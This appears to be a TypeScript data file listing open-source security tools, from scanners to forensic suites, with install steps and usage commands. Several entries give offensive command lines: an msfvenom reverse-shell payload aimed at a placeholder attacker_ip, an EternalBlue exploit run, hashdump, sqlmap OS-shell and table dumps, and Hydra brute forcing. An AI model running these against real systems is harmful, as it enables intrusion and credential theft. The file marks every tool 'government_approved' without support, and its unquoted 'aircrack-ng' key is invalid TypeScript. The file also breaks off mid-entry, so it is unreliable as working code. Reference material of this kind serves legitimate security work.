// Comprehensive database of open-source cybersecurity tools
// Government-grade, enterprise-ready, widely-used security tools

export interface SecurityTool {
  name: string;
  category: string[];
  description: string;
  github: string;
  stars?: string;
  license: string;
  installation: {
    linux: string;
    macos: string;
    windows: string;
  };
  basic_usage: string[];
  advanced_usage: string[];
  examples: {
    command: string;
    description: string;
    output_sample?: string;
  }[];
  api_available?: boolean;
  api_integration?: string;
  government_approved: boolean;
  use_cases: string[];
  documentation: string;
  notes: string[];
}

export const SECURITY_TOOLS_DB: Record<string, SecurityTool> = {
  // ========== NETWORK SCANNING ==========
  nmap: {
    name: "Nmap",
    category: ["network_scanning", "reconnaissance"],
    description: "Industry-standard network scanner for host discovery, port scanning, service detection, and OS fingerprinting. Used by penetration testers and security professionals worldwide.",
    github: "https://github.com/nmap/nmap",
    stars: "10k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install nmap  # Debian/Ubuntu\nsudo yum install nmap  # RHEL/CentOS",
      macos: "brew install nmap",
      windows: "Download installer from https://nmap.org/download.html"
    },
    basic_usage: [
      "nmap <target>  # Basic scan",
      "nmap -sV <target>  # Service version detection",
      "nmap -O <target>  # OS detection",
      "nmap -p- <target>  # Scan all 65535 ports"
    ],
    advanced_usage: [
      "nmap -sS -sV -O -A <target>  # Aggressive scan with OS/service detection",
      "nmap -sU -p 53,161,162 <target>  # UDP scan on specific ports",
      "nmap --script vuln <target>  # Run vulnerability scripts",
      "nmap -iL targets.txt -oA scan_results  # Scan multiple targets, output all formats",
      "nmap -sn 192.168.1.0/24  # Ping sweep (host discovery only)",
      "nmap --script=ssl-enum-ciphers -p 443 <target>  # SSL/TLS cipher enumeration"
    ],
    examples: [
      {
        command: "nmap -sV -sC -oN scan.txt scanme.nmap.org",
        description: "Service detection + default scripts, output to file",
        output_sample: "PORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.4\n80/tcp open http Apache httpd 2.4.6"
      },
      {
        command: "nmap -p 1-65535 -T4 -A -v 192.168.1.1",
        description: "Full port scan with aggressive timing and version detection"
      },
      {
        command: "nmap --script http-enum 192.168.1.1",
        description: "Enumerate web server directories and files"
      }
    ],
    use_cases: [
      "Network asset discovery and inventory",
      "Port scanning and service identification",
      "Security auditing and vulnerability assessment",
      "Network troubleshooting",
      "Penetration testing reconnaissance"
    ],
    documentation: "https://nmap.org/book/man.html",
    notes: [
      "⚠️ Requires authorization - scanning networks without permission is illegal",
      "Use -T4 for faster scans, -T2 for slower/stealthier",
      "NSE scripts provide extensive functionality (--script=)",
      "Output formats: -oN (normal), -oX (XML), -oG (greppable), -oA (all)"
    ]
  },

  masscan: {
    name: "Masscan",
    category: ["network_scanning"],
    description: "Fastest port scanner in the world, capable of scanning the entire Internet in under 6 minutes. Transmits 10 million packets per second.",
    github: "https://github.com/robertdavidgraham/masscan",
    stars: "23k+",
    license: "AGPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install masscan  # Debian/Ubuntu\ngit clone https://github.com/robertdavidgraham/masscan && cd masscan && make",
      macos: "brew install masscan",
      windows: "Download binary from GitHub releases"
    },
    basic_usage: [
      "masscan -p80,443 10.0.0.0/8  # Scan ports 80,443 on entire class A network",
      "masscan -p1-65535 192.168.1.0/24  # Scan all ports on local network",
      "masscan --rate 10000 -p80 0.0.0.0/0  # Scan entire Internet for port 80"
    ],
    advanced_usage: [
      "masscan -p80,443 0.0.0.0/0 --rate=1000000 -oL scan.txt  # Internet-wide scan",
      "masscan 192.168.1.0/24 -p0-65535 --banners -oJ output.json  # Banner grabbing",
      "masscan --rate 100000 --source-port 61234 -p80 10.0.0.0/8  # Custom source port"
    ],
    examples: [
      {
        command: "masscan -p1-65535 192.168.1.1 --rate 1000",
        description: "Fast scan all ports with controlled rate"
      },
      {
        command: "masscan -p443 --banners 0.0.0.0/0 -oL https_scan.txt",
        description: "Scan entire Internet for HTTPS servers with SSL banners"
      }
    ],
    use_cases: [
      "Large-scale network scanning",
      "Internet-wide security research",
      "Rapid asset discovery",
      "Large organization network audits"
    ],
    documentation: "https://github.com/robertdavidgraham/masscan",
    notes: [
      "⚠️ EXTREMELY FAST - can overwhelm networks and trigger IDS/IPS",
      "Requires raw socket privileges (run as root/admin)",
      "Configure --rate appropriately to avoid network disruption",
      "Legal only with explicit authorization"
    ]
  },

  // ========== WEB APPLICATION SECURITY ==========
  "owasp-zap": {
    name: "OWASP ZAP",
    category: ["web_security", "vulnerability_assessment"],
    description: "World's most widely used web application security scanner. Free, open-source, with automated scanning and manual testing tools.",
    github: "https://github.com/zaproxy/zaproxy",
    stars: "12k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh\nchmod +x ZAP_2_14_0_unix.sh && ./ZAP_2_14_0_unix.sh",
      macos: "brew install --cask owasp-zap",
      windows: "Download installer from https://www.zaproxy.org/download/"
    },
    basic_usage: [
      "zap.sh -daemon -port 8080  # Start ZAP daemon",
      "zap-cli quick-scan http://example.com  # Quick scan",
      "zap-cli active-scan http://example.com  # Active scan"
    ],
    advanced_usage: [
      "zap-cli -p 8080 open-url http://example.com && zap-cli spider http://example.com && zap-cli active-scan http://example.com && zap-cli report -o report.html -f html",
      "zap.sh -daemon -config api.key=your_key -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true",
      "zap-cli --api-key your_key alerts -l High"
    ],
    examples: [
      {
        command: "zap-cli quick-scan -s all -r https://target.com",
        description: "Quick scan with all scanners, recursive"
      },
      {
        command: "zap-cli spider https://target.com --max-depth 5",
        description: "Spider website to discover all pages"
      }
    ],
    api_available: true,
    api_integration: "ZAP provides REST API for automation. Use zap-cli or direct API calls.",
    use_cases: [
      "Web application vulnerability scanning",
      "Security testing in CI/CD pipelines",
      "Manual penetration testing",
      "API security testing",
      "OWASP Top 10 vulnerability detection"
    ],
    documentation: "https://www.zaproxy.org/docs/",
    notes: [
      "Can be integrated into CI/CD for automated security testing",
      "GUI and CLI modes available",
      "Supports authentication for testing secured applications",
      "Active scanning may modify application data - use with caution"
    ]
  },

  nuclei: {
    name: "Nuclei",
    category: ["web_security", "vulnerability_assessment"],
    description: "Fast vulnerability scanner based on simple YAML templates. Over 5000+ community-contributed templates for various security checks.",
    github: "https://github.com/projectdiscovery/nuclei",
    stars: "19k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
      macos: "brew install nuclei",
      windows: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    },
    basic_usage: [
      "nuclei -u https://example.com  # Scan single URL",
      "nuclei -list urls.txt  # Scan multiple URLs from file",
      "nuclei -u https://example.com -severity critical,high  # Filter by severity"
    ],
    advanced_usage: [
      "nuclei -u https://example.com -t cves/ -t vulnerabilities/  # Specific templates",
      "nuclei -list targets.txt -severity critical,high -o results.txt -json",
      "nuclei -u https://example.com -automatic-scan  # Automated tech detection and scanning",
      "nuclei -l urls.txt -tags cve,exposure -rate-limit 150 -c 50"
    ],
    examples: [
      {
        command: "nuclei -u https://example.com -tags cve,oast,xss",
        description: "Scan for CVEs, out-of-band, and XSS vulnerabilities"
      },
      {
        command: "nuclei -l domains.txt -t nuclei-templates/ -o scan-results.json -json",
        description: "Scan multiple domains with all templates, JSON output"
      }
    ],
    use_cases: [
      "Continuous vulnerability scanning",
      "Bug bounty hunting",
      "Automated security testing",
      "CVE detection and verification",
      "Misconfiguration detection"
    ],
    documentation: "https://docs.projectdiscovery.io/tools/nuclei/overview",
    notes: [
      "Templates auto-update from GitHub",
      "Extremely fast parallel scanning",
      "Custom template creation supported",
      "Integrates well with other ProjectDiscovery tools (httpx, subfinder, etc.)"
    ]
  },

  // ========== OSINT & RECONNAISSANCE ==========
  theharvester: {
    name: "theHarvester",
    category: ["osint", "reconnaissance"],
    description: "OSINT tool for gathering emails, names, subdomains, IPs, and URLs using multiple public data sources.",
    github: "https://github.com/laramies/theHarvester",
    stars: "11k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install theharvester  # Debian/Ubuntu\ngit clone https://github.com/laramies/theHarvester && cd theHarvester && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/laramies/theHarvester && cd theHarvester && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/laramies/theHarvester && cd theHarvester && pip install -r requirements.txt"
    },
    basic_usage: [
      "theHarvester -d example.com -b google  # Search using Google",
      "theHarvester -d example.com -b all  # Search all sources",
      "theHarvester -d example.com -b bing,google -l 500  # Limit results"
    ],
    advanced_usage: [
      "theHarvester -d example.com -b all -f output.html  # HTML report",
      "theHarvester -d example.com -b shodan,censys -l 1000",
      "theHarvester -d example.com -b google,bing,yahoo -n  # DNS lookup",
      "theHarvester -d example.com -b all -c  # DNS brute force"
    ],
    examples: [
      {
        command: "theHarvester -d microsoft.com -b google,linkedin,bing -l 500",
        description: "Gather emails and names from multiple sources"
      },
      {
        command: "theHarvester -d target.com -b all -f report.xml -n",
        description: "Full OSINT with DNS lookups, export to XML"
      }
    ],
    use_cases: [
      "Email address harvesting for phishing simulations",
      "Subdomain enumeration",
      "Employee information gathering",
      "Initial reconnaissance for penetration testing",
      "Threat intelligence gathering"
    ],
    documentation: "https://github.com/laramies/theHarvester/wiki",
    notes: [
      "Supports 30+ data sources including Shodan, Censys, VirusTotal",
      "Rate limiting applied to avoid detection",
      "Some sources require API keys for full functionality",
      "Legal for public information gathering only"
    ]
  },

  shodan: {
    name: "Shodan",
    category: ["osint", "network_scanning", "vulnerability_assessment"],
    description: "Search engine for Internet-connected devices. Discovers exposed databases, webcams, industrial systems, and misconfigured services worldwide.",
    github: "https://github.com/achillean/shodan-python",
    stars: "2.5k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "pip install shodan",
      macos: "pip install shodan",
      windows: "pip install shodan"
    },
    basic_usage: [
      "shodan init YOUR_API_KEY  # Configure API key",
      "shodan search apache  # Search for Apache servers",
      "shodan host 8.8.8.8  # Get info about specific IP"
    ],
    advanced_usage: [
      "shodan search 'product:MySQL' --limit 1000  # Find MySQL servers",
      "shodan search 'port:3389 country:US' # Find RDP servers in US",
      "shodan download --limit 1000 dataset 'apache'  # Download search results",
      "shodan parse --fields ip_str,port,org dataset.json.gz  # Parse results",
      "shodan count 'vuln:CVE-2021-44228'  # Count Log4Shell vulnerable hosts"
    ],
    examples: [
      {
        command: "shodan search 'port:22 country:US' --fields ip_str,port,org",
        description: "Find SSH servers in United States"
      },
      {
        command: "shodan host 1.1.1.1",
        description: "Get comprehensive information about specific IP",
        output_sample: "IP: 1.1.1.1\nOrganization: Cloudflare\nOS: None\nPorts: 53, 80, 443"
      }
    ],
    api_available: true,
    api_integration: "Shodan provides REST API. Free tier: 100 results/month. Paid: unlimited queries.",
    use_cases: [
      "Asset discovery and attack surface mapping",
      "Vulnerability intelligence gathering",
      "Threat hunting and incident response",
      "Security research on exposed systems",
      "Monitoring for exposed internal systems"
    ],
    documentation: "https://developer.shodan.io/api",
    notes: [
      "Requires API key (free tier available)",
      "Paid memberships unlock advanced filters and higher limits",
      "Data updated continuously from Internet-wide scans",
      "Use responsibly - don't attack discovered systems"
    ]
  },

  // ========== PENETRATION TESTING ==========
  metasploit: {
    name: "Metasploit Framework",
    category: ["pentesting", "exploitation"],
    description: "World's most used penetration testing framework. Contains 2000+ exploits, payloads, and auxiliary modules for security testing.",
    github: "https://github.com/rapid7/metasploit-framework",
    stars: "33k+",
    license: "BSD-3-Clause",
    government_approved: true,
    installation: {
      linux: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
      macos: "brew install metasploit",
      windows: "Download installer from https://windows.metasploit.com/metasploitframework-latest.msi"
    },
    basic_usage: [
      "msfconsole  # Start Metasploit console",
      "search cve:2021  # Search for exploits",
      "use exploit/path/to/module  # Select exploit",
      "show options  # Show exploit options",
      "set RHOSTS target_ip  # Set target",
      "exploit  # Run exploit"
    ],
    advanced_usage: [
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > payload.exe  # Generate payload",
      "db_nmap -sV -sC target_ip  # Nmap scan stored in DB",
      "search type:exploit platform:windows  # Advanced search",
      "use auxiliary/scanner/portscan/tcp && set RHOSTS 192.168.1.0/24 && run  # Port scanning",
      "sessions -i 1  # Interact with session",
      "run post/windows/gather/hashdump  # Post-exploitation module"
    ],
    examples: [
      {
        command: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit",
        description: "Exploit EternalBlue vulnerability (MS17-010)"
      },
      {
        command: "use auxiliary/scanner/http/wordpress_scanner\nset RHOSTS example.com\nset THREADS 10\nrun",
        description: "Scan WordPress installation for vulnerabilities"
      }
    ],
    use_cases: [
      "Vulnerability exploitation and validation",
      "Post-exploitation and lateral movement",
      "Social engineering campaigns",
      "Network penetration testing",
      "Security training and education"
    ],
    documentation: "https://docs.metasploit.com/",
    notes: [
      "⚠️ Only use on authorized targets - exploitation is illegal without permission",
      "Meterpreter provides advanced post-exploitation capabilities",
      "Database support for organizing pen-test data",
      "Regular updates with new exploits and modules",
      "Pro version available with additional features"
    ]
  },

  sqlmap: {
    name: "SQLMap",
    category: ["web_security", "pentesting"],
    description: "Automatic SQL injection and database takeover tool. Supports all major database systems.",
    github: "https://github.com/sqlmapproject/sqlmap",
    stars: "31k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install sqlmap  # Debian/Ubuntu\ngit clone https://github.com/sqlmapproject/sqlmap.git",
      macos: "brew install sqlmap",
      windows: "git clone https://github.com/sqlmapproject/sqlmap.git"
    },
    basic_usage: [
      "sqlmap -u 'http://example.com/page?id=1'  # Test URL",
      "sqlmap -u 'http://example.com/page?id=1' --dbs  # List databases",
      "sqlmap -u 'http://example.com/page?id=1' -D dbname --tables  # List tables"
    ],
    advanced_usage: [
      "sqlmap -u 'URL' --batch --threads=10 --level=5 --risk=3  # Aggressive scan",
      "sqlmap -u 'URL' -p id --technique=BEUSTQ  # All SQL injection techniques",
      "sqlmap -u 'URL' --os-shell  # Get OS command shell",
      "sqlmap -u 'URL' -D database -T users --dump  # Dump users table",
      "sqlmap -r request.txt --tamper=space2comment  # Use request file with tamper",
      "sqlmap -u 'URL' --crawl=3 --batch  # Crawl and test 3 levels deep"
    ],
    examples: [
      {
        command: "sqlmap -u 'http://example.com/product.php?id=1' --batch --dbs",
        description: "Automated scan to enumerate databases"
      },
      {
        command: "sqlmap -u 'http://example.com/login.php' --data='username=admin&password=pass' --method=POST --dbs",
        description: "Test POST parameters for SQL injection"
      }
    ],
    use_cases: [
      "SQL injection vulnerability detection",
      "Database enumeration and extraction",
      "Database takeover demonstrations",
      "Web application security testing",
      "Penetration testing assessments"
    ],
    documentation: "https://github.com/sqlmapproject/sqlmap/wiki",
    notes: [
      "⚠️ Can be destructive - use only on authorized targets",
      "Supports authentication and session handling",
      "Over 100 tamper scripts for bypassing WAFs",
      "Can fingerprint database systems automatically"
    ]
  },

  hydra: {
    name: "Hydra",
    category: ["password_testing", "pentesting"],
    description: "Fast and flexible network login cracker supporting 50+ protocols including HTTP, FTP, SSH, Telnet, RDP.",
    github: "https://github.com/vanhauser-thc/thc-hydra",
    stars: "9k+",
    license: "AGPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install hydra  # Debian/Ubuntu\ngit clone https://github.com/vanhauser-thc/thc-hydra && cd thc-hydra && ./configure && make && make install",
      macos: "brew install hydra",
      windows: "Download from https://github.com/maaaaz/thc-hydra-windows"
    },
    basic_usage: [
      "hydra -l admin -P passwords.txt ssh://192.168.1.100  # SSH brute force",
      "hydra -L users.txt -P passwords.txt ftp://192.168.1.100  # FTP multiple users",
      "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login:user=^USER^&pass=^PASS^:F=failed'"
    ],
    advanced_usage: [
      "hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.100  # 4 parallel tasks",
      "hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100  # Custom SSH port",
      "hydra -C credentials.txt rdp://192.168.1.100  # Use colon-separated credentials",
      "hydra -l admin -x 6:8:aA1 192.168.1.100 ssh  # Generate password combinations"
    ],
    examples: [
      {
        command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.50",
        description: "Brute force SSH with rockyou wordlist"
      },
      {
        command: "hydra -L users.txt -P passwords.txt smb://192.168.1.100",
        description: "Test multiple credentials against SMB"
      }
    ],
    use_cases: [
      "Password strength testing",
      "Credential validation during security audits",
      "Testing authentication mechanisms",
      "Identifying weak passwords on network services",
      "Penetration testing engagements"
    ],
    documentation: "https://github.com/vanhauser-thc/thc-hydra",
    notes: [
      "⚠️ Unauthorized password testing is illegal",
      "Use rate limiting (-t) to avoid account lockouts",
      "Supports proxy and SSL connections",
      "Can save/restore sessions for long-running attacks"
    ]
  },

  hashcat: {
    name: "Hashcat",
    category: ["password_testing", "forensics"],
    description: "World's fastest password recovery tool. Supports 300+ hash algorithms and GPU acceleration.",
    github: "https://github.com/hashcat/hashcat",
    stars: "20k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "sudo apt install hashcat  # Debian/Ubuntu\nDownload from https://hashcat.net/hashcat/",
      macos: "brew install hashcat",
      windows: "Download from https://hashcat.net/hashcat/"
    },
    basic_usage: [
      "hashcat -m 0 -a 0 hash.txt wordlist.txt  # MD5 dictionary attack",
      "hashcat -m 1000 -a 0 hash.txt wordlist.txt  # NTLM dictionary attack",
      "hashcat -m 2500 capture.hccapx wordlist.txt  # WPA/WPA2 cracking"
    ],
    advanced_usage: [
      "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a  # Brute force 8 chars",
      "hashcat -m 1000 -a 6 hash.txt wordlist.txt ?d?d?d?d  # Hybrid attack",
      "hashcat -m 13100 -a 0 hash.txt --username rockyou.txt  # Kerberos 5 TGS-REP",
      "hashcat -m 22000 hash.hc22000 -a 0 rockyou.txt -w 3  # WPA3 (fast workload)",
      "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule  # With rules"
    ],
    examples: [
      {
        command: "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
        description: "Crack Windows NTLM password hashes"
      },
      {
        command: "hashcat -m 0 -a 3 md5_hash.txt ?u?l?l?l?l?l?d?d",
        description: "Brute force MD5: uppercase + 5 lowercase + 2 digits"
      }
    ],
    use_cases: [
      "Password recovery for encrypted files",
      "Forensic analysis of password hashes",
      "Testing password strength policies",
      "Security auditing of user credentials",
      "Wireless network password recovery"
    ],
    documentation: "https://hashcat.net/wiki/",
    notes: [
      "Supports CPU and GPU acceleration (NVIDIA, AMD)",
      "Distributed cracking across multiple machines",
      "Rule-based attacks for password mutations",
      "Can restore sessions if interrupted",
      "Benchmark: hashcat -b to test your hardware"
    ]
  },

  // ========== NETWORK MONITORING & IDS ==========
  snort: {
    name: "Snort",
    category: ["network_monitoring", "ids"],
    description: "Leading open-source Intrusion Detection System (IDS) and Intrusion Prevention System (IPS). Real-time traffic analysis and packet logging.",
    github: "https://github.com/snort3/snort3",
    stars: "3k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install snort  # Debian/Ubuntu\nCompile from source: https://www.snort.org/documents/snort-3-build-on-ubuntu-18-19",
      macos: "brew install snort",
      windows: "Download from https://www.snort.org/downloads"
    },
    basic_usage: [
      "snort -A console -q -c /etc/snort/snort.conf -i eth0  # Start IDS mode",
      "snort -dev -l ./log -i eth0  # Packet logger mode",
      "snort -r capture.pcap  # Read pcap file"
    ],
    advanced_usage: [
      "snort -A fast -b -q -c /etc/snort/snort.conf -i eth0 -l /var/log/snort",
      "snort -c /etc/snort/snort.conf -T  # Test configuration",
      "snort -r capture.pcap -c /etc/snort/snort.conf -K ascii -l ./  # Process pcap with rules"
    ],
    examples: [
      {
        command: "snort -A console -q -c /etc/snort/snort.conf -i eth0",
        description: "Monitor network in real-time with console alerts"
      },
      {
        command: "snort -dev -l /var/log/snort -i eth0",
        description: "Log all packets with data link and verbose output"
      }
    ],
    use_cases: [
      "Real-time network intrusion detection",
      "Protocol analysis and packet logging",
      "Malware traffic detection",
      "Network security monitoring",
      "Compliance monitoring (PCI-DSS, HIPAA)"
    ],
    documentation: "https://www.snort.org/documents",
    notes: [
      "Community rules available at snort.org/downloads",
      "Can run as IDS (passive) or IPS (inline blocking)",
      "Barnyard2 for database integration",
      "Snort 3 is the latest version with improved performance"
    ]
  },

  wireshark: {
    name: "Wireshark",
    category: ["network_monitoring", "forensics"],
    description: "World's most popular network protocol analyzer. Deep inspection of hundreds of protocols with live capture and offline analysis.",
    github: "https://gitlab.com/wireshark/wireshark",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install wireshark  # Debian/Ubuntu",
      macos: "brew install --cask wireshark",
      windows: "Download from https://www.wireshark.org/download.html"
    },
    basic_usage: [
      "wireshark  # Start GUI",
      "tshark -i eth0  # Command-line capture",
      "tshark -r capture.pcap  # Read capture file",
      "tshark -i eth0 -w output.pcap  # Capture to file"
    ],
    advanced_usage: [
      "tshark -i eth0 -f 'port 443' -Y 'ssl.handshake.type == 1' -T fields -e ip.src -e ip.dst",
      "tshark -r capture.pcap -q -z io,phs  # Protocol hierarchy statistics",
      "tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.file_data",
      "tshark -i eth0 -f 'tcp port 80' -Y 'http contains password' -w sensitive.pcap"
    ],
    examples: [
      {
        command: "tshark -i eth0 -f 'host 192.168.1.100' -w capture.pcap",
        description: "Capture all traffic to/from specific host"
      },
      {
        command: "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name",
        description: "Extract all DNS queries from capture"
      }
    ],
    use_cases: [
      "Network troubleshooting and debugging",
      "Security analysis and forensics",
      "Protocol development and analysis",
      "Malware traffic analysis",
      "Network performance analysis"
    ],
    documentation: "https://www.wireshark.org/docs/",
    notes: [
      "Supports 2000+ network protocols",
      "Can decrypt SSL/TLS with private keys",
      "Powerful display filters for analysis",
      "tshark for command-line automation",
      "Can follow TCP streams and reconstruct files"
    ]
  },

  // ========== VULNERABILITY ASSESSMENT ==========
  openvas: {
    name: "OpenVAS",
    category: ["vulnerability_assessment"],
    description: "Full-featured vulnerability scanner with 50,000+ vulnerability tests. Free and open-source alternative to commercial scanners.",
    github: "https://github.com/greenbone/openvas-scanner",
    stars: "3k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install openvas  # Debian/Ubuntu\nsudo gvm-setup  # Initialize\nsudo gvm-start  # Start services",
      macos: "Use Docker: docker run -d -p 443:443 --name openvas mikesplain/openvas",
      windows: "Use Docker or Linux VM"
    },
    basic_usage: [
      "Access web interface: https://localhost:9392",
      "Default credentials: admin / (generated password shown during setup)",
      "Create scan task → Add target → Start scan"
    ],
    advanced_usage: [
      "gvm-cli --gmp-username admin --gmp-password pass socket --xml '<get_tasks/>'",
      "Configure scan configs for different scan types (Full, Fast, Discovery)",
      "Schedule recurring scans",
      "Generate compliance reports (PCI-DSS, HIPAA, ISO 27001)"
    ],
    examples: [
      {
        command: "Create scan via web UI: Configuration → Targets → New Target → Add IPs",
        description: "Setup new vulnerability scan target"
      },
      {
        command: "Scans → Tasks → New Task → Select target and scan config",
        description: "Configure and launch vulnerability scan"
      }
    ],
    use_cases: [
      "Enterprise vulnerability management",
      "Compliance scanning (PCI-DSS, HIPAA)",
      "Continuous security monitoring",
      "Network security audits",
      "Patch management validation"
    ],
    documentation: "https://docs.greenbone.net/",
    notes: [
      "Maintained by Greenbone Networks",
      "Regular feed updates with new vulnerability tests",
      "Can integrate with SIEM systems",
      "Supports authenticated scanning for deeper assessment"
    ]
  },

  trivy: {
    name: "Trivy",
    category: ["vulnerability_assessment", "container_security"],
    description: "Comprehensive security scanner for containers, filesystems, and Git repositories. Detects vulnerabilities, misconfigurations, secrets, and license issues.",
    github: "https://github.com/aquasecurity/trivy",
    stars: "22k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -\necho 'deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main' | sudo tee /etc/apt/sources.list.d/trivy.list\nsudo apt update && sudo apt install trivy",
      macos: "brew install trivy",
      windows: "Download from https://github.com/aquasecurity/trivy/releases"
    },
    basic_usage: [
      "trivy image nginx:latest  # Scan Docker image",
      "trivy fs /path/to/project  # Scan filesystem",
      "trivy repo https://github.com/user/repo  # Scan Git repository"
    ],
    advanced_usage: [
      "trivy image --severity HIGH,CRITICAL nginx:latest  # Filter by severity",
      "trivy image --ignore-unfixed nginx:latest  # Ignore vulnerabilities without fixes",
      "trivy config /path/to/iac  # Scan Infrastructure as Code",
      "trivy image --format json -o results.json nginx:latest  # JSON output",
      "trivy image --security-checks vuln,config,secret nginx:latest  # Multiple check types"
    ],
    examples: [
      {
        command: "trivy image --severity CRITICAL alpine:3.15",
        description: "Scan Alpine image for critical vulnerabilities only"
      },
      {
        command: "trivy fs --security-checks config,secret ./kubernetes/",
        description: "Scan Kubernetes configs for misconfigurations and secrets"
      }
    ],
    use_cases: [
      "Container image vulnerability scanning",
      "CI/CD pipeline security",
      "Kubernetes security scanning",
      "Infrastructure as Code security",
      "Secret detection in code repositories"
    ],
    documentation: "https://aquasecurity.github.io/trivy/",
    notes: [
      "Extremely fast - scans complete in seconds",
      "Supports Docker, Kubernetes, Terraform, CloudFormation",
      "Can scan local and remote images",
      "Integrates with CI/CD tools (GitLab, GitHub Actions, Jenkins)"
    ]
  },

  // ========== FORENSICS ==========
  autopsy: {
    name: "Autopsy",
    category: ["forensics"],
    description: "Digital forensics platform with GUI for analyzing hard drives and mobile devices. Includes timeline analysis, keyword search, and file recovery.",
    github: "https://github.com/sleuthkit/autopsy",
    stars: "2.5k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "Download from https://www.autopsy.com/download/",
      macos: "Not officially supported - use Linux VM",
      windows: "Download installer from https://www.autopsy.com/download/"
    },
    basic_usage: [
      "Launch Autopsy GUI",
      "Create new case",
      "Add data source (disk image, local disk, logical files)",
      "Run ingest modules (hash calculation, keyword search, etc.)",
      "Analyze results"
    ],
    advanced_usage: [
      "Timeline analysis for event reconstruction",
      "EXIF metadata extraction from images",
      "Email analysis (PST, MBOX files)",
      "Registry analysis for Windows systems",
      "Keyword searching with regular expressions"
    ],
    examples: [
      {
        command: "File → New Case → Add Data Source → Select disk image",
        description: "Start forensic investigation on disk image"
      },
      {
        command: "Tools → Run Ingest Modules → Select modules → Start",
        description: "Run automated analysis modules"
      }
    ],
    use_cases: [
      "Digital forensics investigations",
      "Incident response analysis",
      "Malware investigation",
      "Data recovery",
      "Legal e-discovery"
    ],
    documentation: "https://www.autopsy.com/support/",
    notes: [
      "Built on The Sleuth Kit",
      "Module-based architecture for extensibility",
      "Multi-user case collaboration",
      "Supports disk images (dd, E01, raw)",
      "Generate comprehensive forensic reports"
    ]
  },

  volatility: {
    name: "Volatility",
    category: ["forensics", "malware_analysis"],
    description: "Advanced memory forensics framework for extracting artifacts from RAM dumps. Essential for malware analysis and incident response.",
    github: "https://github.com/volatilityfoundation/volatility3",
    stars: "7k+",
    license: "Custom",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\npip3 install -r requirements.txt",
      macos: "Same as Linux",
      windows: "Same as Linux or download standalone exe"
    },
    basic_usage: [
      "vol -f memory.dump windows.info  # Get system info",
      "vol -f memory.dump windows.pslist  # List processes",
      "vol -f memory.dump windows.netscan  # Network connections"
    ],
    advanced_usage: [
      "vol -f memory.dump windows.malfind  # Find hidden/injected code",
      "vol -f memory.dump windows.dumpfiles --pid 1234  # Extract files from process",
      "vol -f memory.dump windows.cmdline  # Extract command-line arguments",
      "vol -f memory.dump windows.registry.hivelist  # List registry hives",
      "vol -f memory.dump windows.filescan | grep -i 'malware'  # Search file handles"
    ],
    examples: [
      {
        command: "vol -f infected.mem windows.pslist",
        description: "List all running processes from memory dump",
        output_sample: "PID\tPPID\tImageFileName\n4\t0\tSystem\n464\t4\tsmss.exe\n552\t464\tcsrss.exe"
      },
      {
        command: "vol -f infected.mem windows.malfind --pid 1337",
        description: "Detect code injection in specific process"
      }
    ],
    use_cases: [
      "Malware analysis and detection",
      "Incident response investigations",
      "Rootkit detection",
      "Memory-resident threat hunting",
      "Forensic examination of running systems"
    ],
    documentation: "https://volatility3.readthedocs.io/",
    notes: [
      "Volatility 3 is Python 3 rewrite with improved performance",
      "Supports Windows, Linux, macOS memory dumps",
      "Can analyze crash dumps and hibernation files",
      "Extensive plugin ecosystem",
      "Essential tool for APT investigations"
    ]
  },

  // ========== WIRELESS SECURITY ==========
  aircrack-ng: {
    name: "Aircrack-ng",
    category: ["wireless", "password_testing"],
    description: "Complete suite for assessing WiFi network security. Includes packet capture, WEP/WPA/WPA2 cracking, and fake access point creation.",
    github: "https://github.com/aircrack-ng/aircrack-ng",
    stars: "5k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install aircrack-ng  # Debian/Ubuntu",
      macos: "brew install aircrack-ng",
      windows: "Use Linux VM or WSL"
    },
    basic_usage: [
      "airmon-ng start wlan0  # Enable monitor mode",
      "airodump-ng wlan0mon  # Capture packets",
